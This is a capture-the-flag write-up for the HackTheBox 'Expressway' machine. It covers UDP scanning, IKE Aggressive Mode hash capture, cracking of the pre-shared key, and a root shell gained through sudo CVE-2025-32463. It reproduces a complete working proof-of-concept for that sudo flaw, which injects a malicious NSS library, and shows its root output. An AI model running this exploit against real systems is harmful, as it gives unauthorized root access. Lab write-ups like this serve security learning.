---
title: WRITE UP - EXPRESSWAY MACHINE
description: This write-up for the retired machine Expressway was completed while the machine was still active on the HackTheBox platform. Publication was held until after its official retirement to comply with platform guidelines.
author: ZoldyckSec
date: 2025-09-28 00:00:00 +0800
categories: [HackTheBox, Expressway]
tags: [CTF, UDP, IKE, Easy, PSK, CVE-2025-32463]
render_with_liquid: false
image:
  path: /assets/img/Expressway/Card-Express.png
---

## Description:

- `Date` Sep 27, 2025
- `Machine` Expressway (Linux)
- `Difficulty` Easy
- `Prepared by` Allan Espinoza(Aka.ZoldyckSec)

## 0. RESUMEN

Durante la evaluación de seguridad realizada sobre el activo Expressway, se logró un compromiso total del sistema (Root) explotando configuraciones obsoletas en el perímetro y vulnerabilidades críticas en componentes locales.

El vector de entrada principal fue el servicio VPN IPSec (IKEv1), el cual se encontraba configurado en "Modo Agresivo" y protegido por una contraseña extremadamente débil. Esto permitió a los auditores interceptar y descifrar las credenciales de acceso a la red interna. Posteriormente, se identificó una vulnerabilidad crítica en la utilidad sudo (CVE-2025-32463) que permitió la elevación inmediata de privilegios a administrador, eludiendo las restricciones de seguridad locales.

## 1.Reconnaissance Phase

Dado que el escaneo TCP inicial solo reveló el puerto 22 (SSH) sin vectores claros de ataque, se procedió a una enumeración exhaustiva de puertos UDP, revelando servicios de infraestructura VPN.

#### 1.1 🔍 UDP Enumeration 

```bash
nmap -sU --top-ports 100 -T4 -v -n --reason -oN UDP 10.10.11.87
```
- `-sU` **UDP Scan**. Sends UDP probes to ports and waits for either a response or an ICMP "port unreachable" message. UDP lacks a handshake, which is why it's typically slower and less accurate than TCP.

- `--top-ports` Scans **the top 100 most common UDP ports** according to the Nmap database (instead of 1-65535). Good for quick reconnaissance, but may miss services on non-standard ports.

- `-T4` **Timing Template**: Aggressive/Fast. Reduces timeouts and waits less for responses → faster scan but higher risk of **false negatives** and more network noise (detectable by IDS/IPS). Often reasonable for UDP, but if a firewall delays responses, prefer `-T3` or `-T4` with retries.

- `-v` **Verbosity**: More detailed console output. Shows progress and useful information. (You can use `-vv`/`-vvv` for more detail, but `-v` is usually sufficient.)

- `-n` **No DNS resolution**. Nmap will not attempt to resolve IP → hostname (faster, less DNS traffic).

- `--reason` Shows **why** Nmap classified a port (e.g., "ICMP port unreachable" → closed; "no response" → open|filtered). Very useful for interpreting UDP results.

#### Resultados relevantes:

```bash
PORT      STATE         SERVICE    REASON
500/udp   open          isakmp     udp-response ttl 63
```

El puerto 500/UDP indica la presencia de un servicio IKE/ISAKMP (Internet Key Exchange), comúnmente utilizado para establecer túneles VPN IPSec.

## 2.Enumeración de VPN (IKE)

Utilizando ike-scan, se identificó que el servidor estaba configurado en Aggressive Mode. Esta configuración es peligrosa porque el servidor envía el hash de autenticación antes de establecer un canal seguro.

```bash
ike-scan -A 10.10.11.87 -P
````

#### Salida del Comando:

```markdown
IKE PSK parameters (g_xr:g_xi:cky_r:cky_i:sai_b:idir_b:ni_b:nr_b:hash_r):
954d1bf7f7949d6216d26034fdededd2dfa91a603a4f2dba9e0a85e1fdce764ba7a868fc85a258472e6c91c905d21b180ca24a93886f0141712fe45862f2d8f54134741c0d2834355421f1d6b845fc58dbee643c0f6c6830a1f095b61c1fcc78e4db59e552db8e763d60f4fe624e24b35f770db5d5120af859985727395e1392:53bec0cd48ec92f2fe60df3751c080f8b6b92b45336312cd6d3c133bf2a5e93d10a30e9c444bd22249e8411d0ce7c3b6d22dbdbb2b0778fd68728aad84adb6dc2ab591fa105ccdcfd512637b76b9a052e0ed24565ce7bc3ba2c368a8b499a2ef4fd8212940256a1bce47db3a621bf582c592eaeb7a37ba519c6666b5a43c29d1:f77714c7d8fd7ed4:305b0ddf6f47d41c:00000001000000010000009801010004030000240101000080010005800200028003000180040002800b0001000c000400007080030000240201000080010005800200018003000180040002800b0001000c000400007080030000240301000080010001800200028003000180040002800b0001000c000400007080000000240401000080010001800200018003000180040002800b0001000c000400007080:03000000696b6540657870726573737761792e687462:679e4a6ac6afed51e8ec22d9f598937227a553ee:692fe7379ce6731b5a5659a3fd0a8ca8d50f05b88f936b5933fd7f8733df1bfd:ffe04d53c6ea615b98594efb211e3caed831a9e2
```

## 3.Explotación

#### 3.1. Cracking de la Pre-Shared Key (PSK)

Con el hash IKE capturado, se realizó un ataque de fuerza bruta offline utilizando un diccionario estándar (rockyou.txt).

#### Evidence:

```bash
psk-crack -d /usr/share/wordlists/rockyou.txt hash
```

```markdown
Running in dictionary cracking mode
key "freakingrockstarontheroad" matches SHA1 hash 54d97619cb37951c5be413903e6d6d2a78be31a7
```

#### 3.1 Acceso

Con la PSK recuperada (freakingrockstarontheroad), fue posible establecer una conexión VPN válida o utilizar estas credenciales para acceder vía SSH (reutilización de credenciales).

- Usuario: ike / expressuser
- Acceso: Shell de usuario con bajos privilegios.

## 4.Escalada de Privilegios

#### 4.1. Enumeración Interna

Una vez dentro del sistema, se revisaron los permisos de sudo. Se detectaron múltiples vectores potenciales:

- Vulnerabilidad de Software (CVE): Se detectó que la versión de sudo instalada era vulnerable al CVE-2025-32463.

#### 4.2. Explotación de CVE-2025-32463

Se optó por explotar el CVE-2025-32463 para una elevación de privilegios directa y limpia. Este exploit aprovecha un fallo en el manejo de rutas de sudo para inyectar una librería compartida maliciosa.

#### Evidence:

- `kh4sh3i/CVE-2025-32463`

```bash
#!/bin/bash
# sudo-chwoot.sh
# CVE-2025-32463 – Sudo EoP Exploit PoC by Rich Mirch
#                  @ Stratascale Cyber Research Unit (CRU)
STAGE=$(mktemp -d /tmp/sudowoot.stage.XXXXXX)
cd ${STAGE?} || exit 1

cat > woot1337.c<<EOF
#include <stdlib.h>
#include <unistd.h>

__attribute__((constructor)) void woot(void) {
  setreuid(0,0);
  setregid(0,0);
  chdir("/");
  execl("/bin/bash", "/bin/bash", NULL);
}
EOF

mkdir -p woot/etc libnss_
echo "passwd: /woot1337" > woot/etc/nsswitch.conf
cp /etc/group woot/etc
gcc -shared -fPIC -Wl,-init,woot -o libnss_/woot1337.so.2 woot1337.c

echo "woot!"
sudo -R woot woot
rm -rf ${STAGE?}
````

```markdown
ike@expressway:~$ ./exploit.sh 
woot!
root@expressway:/# id
uid=0(root) gid=0(root) groups=0(root),13(proxy),1001(ike)
root@expressway:/# whoami
root
```







  
